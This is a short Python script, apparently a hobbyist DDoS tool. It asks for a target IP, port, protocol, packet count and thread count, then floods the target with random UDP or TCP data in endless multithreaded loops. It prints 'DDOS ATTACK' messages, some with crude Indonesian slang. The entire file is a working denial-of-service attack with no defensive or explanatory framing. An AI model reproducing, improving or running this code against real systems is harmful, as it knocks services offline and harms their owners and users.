import random
import socket
import threading
import time
import os,sys

os.system('clear')
print("\033[0;36;40m")
print("""
██╗░░██╗██████╗░██╗░░░██╗██╗░░░██╗██╗░░░██╗
╚██╗██╔╝██╔══██╗╚██╗░██╔╝██║░░░██║██║░░░██║
░╚███╔╝░██████╔╝░╚████╔╝░██║░░░██║██║░░░██║
░██╔██╗░██╔══██╗░░╚██╔╝░░██║░░░██║██║░░░██║
██╔╝╚██╗██║░░██║░░░██║░░░╚██████╔╝╚██████╔╝
╚═╝░░╚═╝╚═╝░░╚═╝░░░╚═╝░░░░╚═════╝░░╚═════╝░""")

ip = str(input("HOST/IP: "))
port = int(input("PORT HOST: "))
choice = str(input("UDP/TCP: "))
times = int(input("PACKETS: "))
threads = int(input("THREADS: "))

os.system('clear')
def udp():
        data = random._urandom(811)
        while True:
                try:
                        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                        addr = (str(ip),int(port))
                        for x in range(times):
                                s.sendto(data,addr)
                        print(f"MENGENTOD IP {ip} MENGOCOK PORT {port}")
                except:
                        print(f"MENGENTOD IP {ip} MENGOCOK PORT {port}")

def tcp():
        data = random._urandom(102400)
        while True:
                try:
                        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        s.connect((ip,port))
                        s.send(data)
                        for x in range(times):
                                s.send(data)
                        print(f"DDOS ATTACK IP {ip} AND PORT {port}")
                except:
                        s.close()
                        print(f"DDOS ATTACK IP {ip} AND PORT {port}")

for y in range(threads):
    if choice == 'UDP':
        th = threading.Thread(target = udp)
        th.start()
    elif choice == 'TCP':
        th = threading.Thread(target = tcp)
        th.start()
